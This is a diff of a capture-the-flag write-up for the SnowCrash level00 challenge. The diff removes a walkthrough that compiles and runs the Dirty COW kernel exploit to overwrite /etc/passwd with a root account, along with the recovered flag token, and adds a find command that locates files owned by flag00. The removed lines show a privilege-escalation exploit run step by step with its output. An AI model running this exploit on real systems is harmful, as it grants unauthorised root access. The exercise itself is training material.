@@ -1,33 +1,8 @@
 LEVEL 00
 
-** dirty cow **
+** find file who belong to flag00 **
 
-https://www.exploit-db.com/exploits/40839
+level00@SnowCrash:~$ find / -user flag00 -type f 2> /dev/null
+/usr/sbin/john
+/rofs/usr/sbin/john
 
-level00@SnowCrash:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
-level00@SnowCrash:/tmp$ ./dirty
-/etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password:
-Complete line:
-firefart:fi9qqr4F6Msv.:0:0:pwned:/root:/bin/bash
-
-mmap: b7fda000
-
-^C
-level00@SnowCrash:/tmp$ su firefart
-Password:
-firefart@SnowCrash:/tmp# getflag
-Check flag.Here is your token : You are root are you that dumb ?
-
-
-firefart@SnowCrash:/tmp# su flag00
-Don't forget to launch getflag !
-flag00@SnowCrash:~$ ls
-README.txt
-flag00@SnowCrash:~$ cat README.txt
-Don't forget to launch getflag !
-flag00@SnowCrash:~$ getflag
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-
-
-su level01 avec le token flag00 en mdp
